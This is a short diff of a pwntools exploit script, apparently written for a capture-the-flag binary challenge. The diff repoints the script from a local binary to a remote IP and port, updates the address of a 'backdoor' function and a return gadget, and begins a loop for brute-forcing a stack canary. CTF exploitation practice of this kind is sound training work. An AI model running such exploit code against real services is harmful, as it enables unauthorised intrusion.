@@ -4,13 +4,12 @@
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
-context.binary = './a.out'
 context.log_level = 'debug'
 context.timeout = 5
 
-io = process('./a.out')
-# io = remote('127.0.0.1', 13337)
-elf = ELF('./a.out')
+io = process('./pwn')
+io = remote('47.113.197.7', 35007)
+elf = ELF('./pwn')
 
 
 def debug(gdbscript="", stop=False):
@@ -43,8 +42,8 @@ ic  = io.close
 cr  = io.can_recv
 
 
-backdoor=0x00000000004012b7
-ret=0x40131c
+backdoor=0x00000000004012db
+ret=0x4013f4
 canary=b'\x00'
 for i in range(7):
     key=1
